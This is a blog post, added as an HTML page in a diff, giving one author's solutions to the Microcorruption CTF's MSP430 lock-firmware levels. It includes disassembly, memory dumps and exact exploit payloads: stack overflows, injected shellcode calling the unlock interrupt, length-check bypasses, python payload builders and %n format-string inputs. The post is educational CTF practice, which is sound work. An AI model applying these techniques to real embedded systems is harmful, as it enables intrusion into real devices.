@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Solving Microcorruption</title>
+  <meta name="description" content="My growing interest towards low-level programming led me to a CTF game called Microcorruption. The goal there is to do a series of challenges related to hack...">
+
+  <!-- Google Fonts loaded here depending on setting in _data/options.yml true loads font, blank does not-->
+  
+    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
+  
+  
+  <!-- Load up MathJax script if needed ... specify in /_data/options.yml file-->
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+  <link rel="stylesheet" type="text/css" href="/css/tufte.css">
+  <!-- <link rel="stylesheet" type="text/css" href="/css/print.css" media="print"> -->
+
+  <link rel="canonical" href="/articles/microcorruption">
+
+  <link rel="alternate" type="application/rss+xml" title="Kirill Dubovikov" href="/feed.xml" />
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" >
+  <link rel="stylesheet" href="/css/animate.css" />
+
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.0/dist/mermaid.min.js"></script>
+  <script src="/scripts/wow.min.js"></script>
+  <script>
+  new WOW().init();
+  </script>
+
+  <script src="https://kit.fontawesome.com/27c1873205.js" crossorigin="anonymous"></script>
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-166077200-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-166077200-1');
+  </script>
+
+  <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="kdubovikov" data-description="Support me" data-message="Support this blog" data-color="#D7CDCC" data-position="right" data-x_margin="40" data-y_margin="18"></script>
+</head>
+
+  <body>
+    <!--- Header and nav template site-wide -->
+<header>
+    <nav class="group">
+	<div class="head-social-links">
+	
+	
+		
+		    
+		      <a href="/">Kirill Dubovikov</a>
+		    
+	    
+  	
+		
+		    
+		      <a href="/categories/">Categories</a>
+		    
+	    
+  	
+    
+        <a class="social-link" href="//www.twitter.com/kdubovikov"><span class="icon-twitter"/></a>
+    
+        <a class="social-link" href="//github.com/kdubovikov"><span class="icon-github"/></a>
+    
+        <a class="social-link" href="//linkedin.com/in/kirill-dubovikov-2a20b154/"><span class="icon-linkedin"/></a>
+      
+	</div>
+	</nav>
+</header>
+    <article class="group">
+      <h1 class="contrast">Solving Microcorruption</h1>
+<p class="subtitle">February 20, 2024</p>
+
+<p>My growing interest towards low-level programming led me to a CTF game called <a href="https://microcorruption.com/">Microcorruption</a>. The goal there is to do a series of challenges related to hacking embedded systems. There is some dissasembly of a digital lock firmware that you should analyze and exploit to find a way for opening the door. Each level progressively increases in complexity. I feel that the difficulty progression was great and in general it’s a good tool to learn basic binary exploitation vulnerabilities.</p>
+
+<p>Most of the vulernabilities explored there are related to stack overflows, format string attacks, heap overflows. If you consider modern OS, most of these are considered outdated and are not as common as they used to be. However, if we embark in a world of embedded systems, these are still very relevant. In this post, I will provide my solutions and notes for different levels of Microcorruption.</p>
+
+<!--more-->
+
+<h2 id="prerequisites">Prerequisites</h2>
+<p>Before starting Microcorruption, I would recommend to have some basic knowledge of assembly language and binary exploitation. If you want to get a good ghasp on assemby, there is a great book called “RE for beginners” by Dennis Yurichev. If you want to understand how binary exploitation works, I highly recommend reading “Hacking - The Art of Exploitation” by Jon Erickson.</p>
+
+<h2 id="importnant-notes">Importnant notes</h2>
+
+<ul>
+  <li>Do not be confined to the main debugger screen. You can use the disassembler to look at the code and the memory viewer to look at the memory. This is very useful for understanding the code and the memory layout. Understanding that there is no boundary between the code and the data is crucial.</li>
+  <li>RTFM. The site includes manuals for the LockItUp 1.0 and the MSP430. You should read them to understand the instructions and the memory layout. It’s not necessary to read them back to back, but if you feel stuck try to uncover any new ways to get around security by reading them.</li>
+  <li>Do not bash your head against the wall. If you feel stuck, take a break and try an alternative approach. Some levels switch from one exploitation technique to another, so it’s important to be flexible and not to be confined to one approach.</li>
+</ul>
+
+<h2 id="hanoi">Hanoi</h2>
+<p>This level is mostly about stepping through the code. The input password prompt mentions that the password should be between 8 to 16 characters in length. After quickly observing the code, I noticed that there are two interesting functions: <code class="language-plaintext highlighter-rouge">test_password_valid</code> and <code class="language-plaintext highlighter-rouge">login</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4454 &lt;test_password_valid&gt;
+4454:  0412           push	r4
+4456:  0441           mov	sp, r4
+4458:  2453           incd	r4
+445a:  2183           decd	sp
+445c:  c443 fcff      mov.b	#0x0, -0x4(r4)
+4460:  3e40 fcff      mov	#0xfffc, r14
+4464:  0e54           add	r4, r14
+4466:  0e12           push	r14
+4468:  0f12           push	r15
+446a:  3012 7d00      push	#0x7d
+446e:  b012 7a45      call	#0x457a &lt;INT&gt;
+4472:  5f44 fcff      mov.b	-0x4(r4), r15
+4476:  8f11           sxt	r15
+4478:  3152           add	#0x8, sp
+447a:  3441           pop	r4
+447c:  3041           ret
+
+4520 &lt;login&gt;
+4520:  c243 1024      mov.b	#0x0, &amp;0x2410
+4524:  3f40 7e44      mov	#0x447e "Enter the password to continue.", r15
+4528:  b012 de45      call	#0x45de &lt;puts&gt;
+452c:  3f40 9e44      mov	#0x449e "Remember: passwords are between 8 and 16 characters.", r15
+4530:  b012 de45      call	#0x45de &lt;puts&gt;
+4534:  3e40 1c00      mov	#0x1c, r14
+4538:  3f40 0024      mov	#0x2400, r15
+453c:  b012 ce45      call	#0x45ce &lt;getsn&gt;
+4540:  3f40 0024      mov	#0x2400, r15
+4544:  b012 5444      call	#0x4454 &lt;test_password_valid&gt;
+4548:  0f93           tst	r15
+454a:  0324           jz	$+0x8 &lt;login+0x32&gt;
+454c:  f240 4d00 1024 mov.b	#0x4d, &amp;0x2410
+4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
+4556:  b012 de45      call	#0x45de &lt;puts&gt;
+455a:  f290 6500 1024 cmp.b	#0x65, &amp;0x2410
+4560:  0720           jnz	$+0x10 &lt;login+0x50&gt;
+4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
+4566:  b012 de45      call	#0x45de &lt;puts&gt;
+456a:  b012 4844      call	#0x4448 &lt;unlock_door&gt;
+456e:  3041           ret
+4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
+4574:  b012 de45      call	#0x45de &lt;puts&gt;
+4578:  3041           ret
+</code></pre></div></div>
+
+<p>After stepping through <code class="language-plaintext highlighter-rouge">test_password_valid</code>, it was not obvious what it does. So, let’s proceed level by level first, and see if <code class="language-plaintext highlighter-rouge">login</code> has any low hanging fruits. If we step through <code class="language-plaintext highlighter-rouge">login</code>, we will notice, that after we have entered a test valid password, we will continue till <code class="language-plaintext highlighter-rouge">cmp.b	#0x42, &amp;0x2410</code>, and after that immediately there is an access granted jump gate! If we examine address <code class="language-plaintext highlighter-rouge">&amp;0x2410</code> in the memory dump, it will become clear that upper address stores our password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2400: 4d59 5041 5353 574f 5244 0000 0000 0000   MYPASSWORD......
+2410: 0000 0000 0000 0000 0000 0000 0000 0000   ................
+</code></pre></div></div>
+
+<p>So, let’s just try to overflow the input buffer with 17 characters. Then, our 17th byte will be stored exactly at address <code class="language-plaintext highlighter-rouge">0x2410</code>. When adding correct ASCII code character to the password of length 17, the lock opens.</p>
+
+<h2 id="cusco">Cusco</h2>
+<p>Here, the code seems to be working flawlessly. However, we can notice that entered password is stored directly on the stack. If we recall that function return address is stored on the stack as well, we may want to try to overwrite it with some value that will change the control flow of the program so that our <code class="language-plaintext highlighter-rouge">main</code> function will actually return to some other address than originally intended.</p>
+
+<p>If we will place breakpoint at the <code class="language-plaintext highlighter-rouge">ret</code> instruction in the <code class="language-plaintext highlighter-rouge">main</code> function and experiment with password length, we can observe that setting password to 17 characters overwrites location where <code class="language-plaintext highlighter-rouge">sp</code> points at. And, as we know, when function returns, the CPU gets the return address from the top of the stack. That’s where <code class="language-plaintext highlighter-rouge">sp</code> points at! So, if we will take last 4 bytes of our 17-char password and modify them to be any address of our program, the <code class="language-plaintext highlighter-rouge">ret</code> instruction will jump there. So, we can just look at the address of <code class="language-plaintext highlighter-rouge">call	#0x4446 &lt;unlock_door&gt;</code> and solve this challenge. Just do not forget to reverse the byte order in your payload since the processor architecture is little endian.</p>
+
+<h2 id="reykjavik">Reykjavik</h2>
+<p>Something wired is happening here. If we will go through the code listing, we won’t find any usual password prompting code. However, there is a mysterious <code class="language-plaintext highlighter-rouge">enc</code> function that does something interesting. <code class="language-plaintext highlighter-rouge">xor</code> is involved, so this is likely some encoding function. If we will step through the code, we will jump to some memory location after calling <code class="language-plaintext highlighter-rouge">enc</code>. We see that there is this <code class="language-plaintext highlighter-rouge">call	#0x2400</code> instruction after our <code class="language-plaintext highlighter-rouge">enc</code> call.  To understand what happens next, we have to switch our mindset a bit. In assembly, code is data and data is code. We have just jumped to some arbitrary memory location outside of our usual code segment. But for processor, it does not matter from where to execute the instructions. So, we know where this encoded function starts, but how to find where it ends so that we can study it. Since this is a function, we can just look up an opcode for <code class="language-plaintext highlighter-rouge">ret</code>, which is <code class="language-plaintext highlighter-rouge">3041</code>. We can copy all bytes of this function and go to the Disassembler screen. Let’s paste them there and hit the disassemble button. Eurika! We get the function code. Let’s understand what it does:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; prepare stack frame
+0b12           push	r11
+0412           push	r4
+0441           mov	sp, r4
+; local variables
+2452           add	#0x4, r4
+3150 e0ff      add	#0xffe0, sp
+3b40 2045      mov	#0x4520, r11 ; interesting, what's here? it's the address of "what's the password?" string
+073c           jmp	$+0x10
+1b53           inc	r11
+8f11           sxt	r15
+0f12           push	r15
+0312           push	#0x0
+b012 6424      call	#0x2464 ; this is likely a call for puts
+2152           add	#0x4, sp
+6f4b           mov.b	@r11, r15
+4f93           tst.b	r15
+f623           jnz	$-0x12
+3012 0a00      push	#0xa
+0312           push	#0x0
+b012 6424      call	#0x2464 ; this is some another mysterious address, let's check it out. The code is below. Its an interrupt call
+2152           add	#0x4, sp
+3012 1f00      push	#0x1f
+3f40 dcff      mov	#0xffdc, r15
+0f54           add	r4, r15
+0f12           push	r15
+2312           push	#0x2
+b012 6424      call	#0x2464 ; calling this guy again
+3150 0600      add	#0x6, sp
+b490 83ad dcff cmp	#0xad83, -0x24(r4)
+0520           jnz	$+0xc
+3012 7f00      push	#0x7f
+b012 6424      call	#0x2464 ; and again! UNLOCK call here
+2153           incd	sp
+3150 2000      add	#0x20, sp
+3441           pop	r4
+3b41           pop	r11
+3041           ret
+
+; 0x2464 function - this looks exacly as our INT function from earlier, so we are calling an interrupt here!
+1e41 0200      mov	0x2(sp), r14
+0212           push	sr
+0f4e           mov	r14, r15
+8f10           swpb	r15
+024f           mov	r15, sr
+32d0 0080      bis	#0x8000, sr
+b012 1000      call	#0x10
+3241           pop	sr
+3041           ret
+</code></pre></div></div>
+
+<p>From previous challenge we know, that this interrupt sequence unlocks the door</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4446:  3012 7f00      push	#0x7f
+444a:  b012 4245      call	#0x4542 &lt;INT&gt;
+</code></pre></div></div>
+
+<p>We have this interrupt callout in our encoded function. From the looks of it, the code is exactly the same as it was previously, but it’s not stored in the code segment of the binary now. So, my guess is that the previous overflow bug should still work, but the return address will now be different. Let’s find the correct return address and try to overflow the stack yet again. The opcode for our unlock interrupt is <code class="language-plaintext highlighter-rouge">b012 6424</code>. Now, let’s locate it in the memory dump and record the address. It is <code class="language-plaintext highlighter-rouge">0x2458</code>.</p>
+
+<ul>
+  <li>Address where our string starts: <code class="language-plaintext highlighter-rouge">0x43dc</code></li>
+  <li>Address where encoded function returns: <code class="language-plaintext highlighter-rouge">0x4400</code></li>
+  <li>Payload length should be 36 symbols</li>
+</ul>
+
+<p>After checking the stack overflow path it became clear that we can’t overflow the stack this time to the point that we will overwrite the return address of this encoded function.
+Let’s look at the function source again:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b490 83ad dcff cmp	#0xad83, -0x24(r4)
+0520           jnz	$+0xc
+3012 7f00      push	#0x7f
+b012 6424      call	#0x2464 ; and again! UNLOCK call here
+</code></pre></div></div>
+
+<p>Probably, this <code class="language-plaintext highlighter-rouge">cmp</code> is the key. If we will try try out entering password <code class="language-plaintext highlighter-rouge">83ad</code> in hex to account for little endianness we will unlock the door!</p>
+
+<h2 id="whitehorse">Whitehorse</h2>
+
+<p>There’s a quick find in the spirit of previous challenges that we can utilize right away. Overflow prompt that allows us to jump to any address on <code class="language-plaintext highlighter-rouge">main</code> return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1234567890AAAAAAAAAAAAAAAAAAAAAABBBB
+</code></pre></div></div>
+
+<p>I was wondering what to do after I’ve fond an overflow for quite a while. There is no clear place in the code that we can jump to to get around security. As it turns out, the key to this challenge is to read the manual. After inspecting the manual that you can find on the microcorruption site, we shall see that there is an interrupt <code class="language-plaintext highlighter-rouge">0x7f</code> that can unlock the door. Since we have an overflow payload now, we can embed assembly to execute the 0x7F interrupt in there using disassembler tool provided on the site. We can create this bytecode:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3012 7f00      push	#0x7f
+b012 3245      call	#0x4532 &lt;INT&gt;
+</code></pre></div></div>
+
+<p>Now, we need to capture the return address to be some part of our prompt where we will inject the bytecode for interrupt call. The address where our prompt will start is at <code class="language-plaintext highlighter-rouge">0x3bf4</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3be0: 0000 4645 0100 4645 0300 ba45 0000 0a00   ..FE..FE...E....
+3bf0: 0000 2a45 1234 5678 90aa aaaa aaaa aaaa   ..*E.4Vx........
+3c00: aaaa aaaa 5844 aaaa aaaa aaaa aaaa aaaa   ....XD..........
+3c10: aaaa aaaa aa00 0000 0000 0000 0000 0000   ................
+3c20: 0000 0000 0000 0000 0000 0000 0000 0000   ................
+</code></pre></div></div>
+
+<p>Let’s create our payload. We can just insert instructions at the start of the prompt and put the return address in little endian format to where <code class="language-plaintext highlighter-rouge">sp</code> is pointing at. The payload will look like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>30127f00b0123245AAAAAAAAAAAAAAAAf43b
+</code></pre></div></div>
+
+<p>Here is a dissection of this payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ┌──────────────────────────────────────────────┐
+    │                                              │
+    │                                              │
+    │ ┌────────────────────────────────────────┐   │
+    │ │                                        │   │
+    ▼ ▼                                        │   │
+  0x3b34: 3012 7f00 b012 3245 AAAAAAAAAAAAAAAA f4 3b
+          ───────── ───────── ──────────────── ── ──
+          push      call      padding          stack
+          0x7f      &lt;INT&gt;                      pointer
+</code></pre></div></div>
+
+<h2 id="montevideo">Montevideo</h2>
+<p>This time, the input string is copied from one portion of the memory to another. The issue is that we still can overflow the stack to get to the return address. sp on <code class="language-plaintext highlighter-rouge">login</code> return points to <code class="language-plaintext highlighter-rouge">0x43f0</code>, and with long enough prompt we can still set it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>43f0: aaaa aaaa aaaa aaaa aaaa aaaa aaaa [aaaa] &lt;- sp points here   ................
+4400: aaaa aaaa aaaa aaaa aaaa aaaa 005a  3f40                     .............Z?@
+</code></pre></div></div>
+
+<p>So, let’s try out our unlock interrupt payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>30127f00b0123245AAAAAAAAAAAAAAAAAAf043
+</code></pre></div></div>
+
+<p>When we do this, we observe that the whole string is not being copied to the destination memory. What’s wrong there?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4514:  3e40 0024      mov	#0x2400, r14
+4518:  0f41           mov	sp, r15
+451a:  b012 dc45      call	#0x45dc &lt;strcpy&gt; &lt;- HERE!
+451e:  3d40 6400      mov	#0x64, r13
+4522:  0e43           clr	r14
+4524:  3f40 0024      mov	#0x2400, r15
+4528:  b012 f045      call	#0x45f0 &lt;memset&gt;
+</code></pre></div></div>
+
+<p>The problem is that our payload includes the <code class="language-plaintext highlighter-rouge">00</code> byte which <code class="language-plaintext highlighter-rouge">strcpy</code> interprets as the end of the string, so it stops there. To get around this, we can modify our payload to hide the <code class="language-plaintext highlighter-rouge">00</code> byte. Thankfully, the only <code class="language-plaintext highlighter-rouge">00</code> that we have is in our interrupt code: <code class="language-plaintext highlighter-rouge">7f00</code>. So, we can just hide it by using some maths, like <code class="language-plaintext highlighter-rouge">7f11-0011 = 7f00</code>. No null byte in the code 🏴‍☠️. Let’s modify our payload. We will use <code class="language-plaintext highlighter-rouge">r15</code> as a temporary register for computing the interrupt code</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov #0x7f11,r15
+add #-0x11,r15
+push r15
+call	#0x454c
+</code></pre></div></div>
+
+<p>The above code assembles into</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3f40117f3f50efff0f12b0124c45AAAAee43
+</code></pre></div></div>
+
+<p>After trying this I had some troubles due to <code class="language-plaintext highlighter-rouge">sr</code> redister which turns off the CPU before the interrupt gets called. So, why mess with assembly payload at all, when we can just overwrite the first argument of <code class="language-plaintext highlighter-rouge">INT</code> to be <code class="language-plaintext highlighter-rouge">0x7f</code> by putting it on the stack? It reads the interrupt code from the stack right at the start of the function anyways. Let’s try this payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4c45bbbb7f00
+</code></pre></div></div>
+
+<p>And yes, this is indeed a much simpler solution. The door unlocks.</p>
+
+<h2 id="johannesburg">Johannesburg</h2>
+<p>Observation: we can overwrite first few functions using prompt, stack still overflows. There is a password length check that avoids calling <code class="language-plaintext highlighter-rouge">ret</code> in an attempt to prevent the stack overflow.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4578:  f190 4600 1100 cmp.b	#0x46, 0x11(sp)
+457e:  0624           jz	$+0xe &lt;login+0x60&gt;
+4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
+4584:  b012 f845      call	#0x45f8 &lt;puts&gt;
+4588:  3040 3c44      br	#0x443c &lt;__stop_progExec__&gt; ; if the password is too long, we wont reach ret
+</code></pre></div></div>
+
+<p>The password length check just checks one byte at some memory location:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmp.b	#0x46, 0x11(sp)
+</code></pre></div></div>
+
+<p>We can easily set this byte to 0x46 and bypass the check:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>424242424242424242424242424242424246
+</code></pre></div></div>
+
+<p>Done 💀. Now we can overflow the return address.
+Let’s use our <code class="language-plaintext highlighter-rouge">0x7f</code> payload from before. The <code class="language-plaintext highlighter-rouge">INT</code> address is <code class="language-plaintext highlighter-rouge">0x4594</code> this time:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>424242424242424242424242424242424246944543437f00
+</code></pre></div></div>
+
+<p>The lock opens!</p>
+
+<h2 id="santa-cruz">Santa Cruz</h2>
+<p>Wow, lot’s of code. Asks us to ender password and username. Obesrvation: there is a length checking loop.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>45d0:  0f4b           mov	r11, r15
+45d2:  0e44           mov	r4, r14
+45d4:  3e50 e8ff      add	#0xffe8, r14 o ; -24
+45d8:  1e53           inc	r14 ; we are incrementing counter
+45da:  ce93 0000      tst.b	0x0(r14) ; and testing if we've met a null byte here
+45de:  fc23           jnz	$-0x6 &lt;login+0x88&gt;
+45e0:  0b4e           mov	r14, r11
+45e2:  0b8f           sub	r15, r11
+45e4:  5f44 e8ff      mov.b	-0x18(r4), r15; -0x18(r4) stores 16 (dec)
+45e8:  8f11           sxt	r15
+45ea:  0b9f           cmp	r15, r11 ; comparing length here
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
+</code></pre></div></div>
+
+<p>This is local var for minimum password length located at abs address 0x43b4. There is similar check that checks previous byte for minimum length:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
+</code></pre></div></div>
+
+<p>We can craft a username payload to overwrite this</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>414141414141414141414141414141414108101041414141414141414141414141414141414141413a46
+414141414141414141414141414141414108101042424242424242424242424242424242424242423a46
+4141414141414141414141414141414141081010
+</code></pre></div></div>
+
+<p>The return address of SP in <code class="language-plaintext highlighter-rouge">login</code> function is at 0x43c0.</p>
+
+<p>There are two instructions that make some comparison at the end of the function</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>464c:  c493 faff      tst.b	-0x6(r4)
+4650:  0624           jz	$+0xe &lt;login+0x10e&gt;
+</code></pre></div></div>
+
+<p>We place this 00 in memory right at the start of the function</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>455c:  c443 faff      mov.b	#0x0, -0x6(r4)
+</code></pre></div></div>
+
+<p>We need this test to pass. Adding zeroes before our address won’t work due to strcpy. There is one new door that has opened for us. Since we now control length checks, we can overflow the password too!
+We can choose the password length that we need, then set 00 at the correct address to bypass the last check.
+After a lot of trial and error, I came with the correct username and password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4141414141414141414141414141414141084040424242424242424242424242424242424242424242423a46
+4343434343434343434343434343434343
+</code></pre></div></div>
+
+<h2 id="jakarta">Jakarta</h2>
+
+<p>When we enter password, <code class="language-plaintext highlighter-rouge">getsn</code> call writes it to the same memory location as our previous username.</p>
+
+<p>There might be a bug in terms of how we compute the username length:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4596:  1f53           inc	r15
+4598:  cf93 0000      tst.b	0x0(r15)
+459c:  fc23           jnz	$-0x6 &lt;login+0x36&gt;
+459e:  0b4f           mov	r15, r11 ; r11 now contains address of the end of the string
+45a0:  3b80 0224      sub	#0x2402, r11 ; r11 now contains the length of the string
+45a4:  3e40 0224      mov	#0x2402, r14 ; r14 now contains the start of the string
+45a8:  0f41           mov	sp, r15
+45aa:  b012 f446      call	#0x46f4 &lt;strcpy&gt; ; here, we copy all of it to memory. The limit is 512 bytes according to first getsn limit
+45ae:  7b90 2100      cmp.b	#0x21, r11 ; check the length of the string against 33
+45b2:  0628           jnc	$+0xe &lt;login+0x60&gt;
+</code></pre></div></div>
+
+<p>Here, we do sub to compute the actual length, and r15 contains our location of the 00 byte in the username. We can easily trick the check by including 00 byte at the start of the username, but then strcpy will skip copying the whole string. The second getsn call copies max 32 chars into memory, but what about subsequent strcpy call? It will copy everything up to 00 byte again, which will be a part of our password string no matter what.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;r11 contains username length
+45c8:  3e40 1f00      mov	#0x1f, r14
+45cc:  0e8b           sub	r11, r14
+; now, r14 contains 31 - r11 = remaining chars up to 32 symbols of username + password
+
+; keeps the last 9 bits of the value and zeroes the rest of them
+and	#0x1ff, r14 
+; address where to copy the password
+mov	#0x2402, r15
+; get the password
+call	#0x46b8 &lt;getsn&gt;
+</code></pre></div></div>
+
+<p>After lots of trials an errors and finally giving up and browsing the internet I’ve found that there is a mistake here:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>45c8:  3e40 1f00      mov	#0x1f, r14
+45cc:  0e8b           sub	r11, r14 ; 31 dec - your username length.
+45ce:  3ef0 ff01      and	#0x1ff, r14
+45d2:  3f40 0224      mov	#0x2402, r15
+45d6:  b012 b846      call	#0x46b8 &lt;getsn&gt;
+</code></pre></div></div>
+
+<p>0x1f is 31 in decimal, but we can enter a password longer than that. And this will cause an overflow in r14. Since this controls how many chars we will get for a password afterwards, we can try to overflow the password field now!
+Let’s try a username of length 32, and some really long password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4242424242424242424242424242424242424242424242424242424242424242
+</code></pre></div></div>
+
+<p>Yes, we can now trick <code class="language-plaintext highlighter-rouge">strcpy</code> into copying all of this beauty onto the stack! But what about the length checks?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>45fa:  3f80 0224      sub	#0x2402, r15
+45fe:  0f5b           add	r11, r15
+4600:  7f90 2100      cmp.b	#0x21, r15 ; compare that lower bytes are less than 0x21
+4604:  0628           jnc	$+0xe &lt;login+0xb2&gt;
+</code></pre></div></div>
+
+<p>This check compares only lower bytes, not upper bytes. So… what about password of length 0x0100? Then, we will add to r11, which will be <code class="language-plaintext highlighter-rouge">0x20</code>, and our check should pass.
+If we will examine the return address, we will find out that our <code class="language-plaintext highlighter-rouge">sp</code> is at <code class="language-plaintext highlighter-rouge">0x4</code> offset from our password string. And the unlock interrupt address is at <code class="language-plaintext highlighter-rouge">461c</code>. Now, it’s down to some simple math to overflow the return address.</p>
+
+<p>Let’s whisper our incantations now, and unlock the door:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># username
+python -c 'print("42"*32)' | pbcopy  
+
+# password
+python -c 'print("424242421c46" + "42" * (0x100 - 0x6))' | pbcopy 
+</code></pre></div></div>
+
+<h2 id="addis-ababa">Addis Ababa</h2>
+<p>Since <code class="language-plaintext highlighter-rouge">printf</code> is used here, it’s possibly vulernable to https://owasp.org/www-community/attacks/Format_string_attack.</p>
+
+<p>Useful readup on why they work: https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4476:  814f 0000      mov	r15, 0x0(sp)
+447a:  0b12           push	r11
+447c:  b012 c845      call	#0x45c8 &lt;printf&gt;
+</code></pre></div></div>
+<p>Looks like format string is not being used here! It’s interesting how we test for unlock here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4472:  b012 b044      call	#0x44b0 &lt;test_password_valid&gt;
+4476:  814f 0000      mov	r15, 0x0(sp)
+...
+448a:  8193 0000      tst	0x0(sp)
+448e:  0324           jz	$+0x8 &lt;main+0x5e&gt;
+4490:  b012 da44      call	#0x44da &lt;unlock_door&gt;
+</code></pre></div></div>
+
+<p>So, if we could put 0 at the top of the stack, we will trigger the unlock.
+We copy only first 19 characters:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4454:  3e40 1300      mov	#0x13, r14 ; 0x13 == 19
+4458:  3f40 0024      mov	#0x2400, r15
+445c:  b012 8c45      call	#0x458c &lt;getsn&gt;
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">%n</code> format specifier can be used to write to memory. It writes the number of characters successfully written so far to the integer pointed to by its corresponding argument. If an attacker can control the format string, they can use <code class="language-plaintext highlighter-rouge">%n</code> to write arbitrary values to arbitrary locations.</p>
+
+<blockquote>
+  <p>n The argumentis is of type unsigned int*. Saves the number of characters printed thus far. No output is produced.</p>
+</blockquote>
+
+<p>Indeed, if we use something like this, we will crash the program</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaa%n%n:aaaa%n%n%n
+</code></pre></div></div>
+
+<p>I noticed that the program jumps to address 6161, which is <code class="language-plaintext highlighter-rouge">aa</code> in char. If I will take the call address of unlock 0x4490 and add it to the first letters of our password</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'print("9044" + "".join(format(ord(c), "02x") for c in "a%n%n:bbb"))' 
+</code></pre></div></div>
+
+<p>However, now address 0x4490 got overwritten with something
+Ok, looks like we can overwrite memory at the location of the first two chars with the total number of chars written. This can be used to modify some instruction to bypass the correctness check.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>447c:  b012 c845      call	#0x45c8 &lt;printf&gt;
+4480:  2153           incd	sp
+4482:  3f40 0a00      mov	#0xa, r15
+4486:  b012 5045      call	#0x4550 &lt;putchar&gt;
+448a:  8193 0000      tst	0x0(sp) ; this checks the return value from test password function
+448e:  0324           jz	$+0x8 &lt;main+0x5e&gt;
+4490:  b012 da44      call	#0x44da &lt;unlock_door&gt;
+</code></pre></div></div>
+
+<p>Luckily, we can easily override the top of the stack with some non-zero number to bypass the <code class="language-plaintext highlighter-rouge">tst</code> and subsequent <code class="language-plaintext highlighter-rouge">jz</code>. Let’s locate the address of the top of the stack and create our payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'print("a630" + "".join(format(ord(c), "02x") for c in "a%n%n:bbb"))' 
+</code></pre></div></div>
+
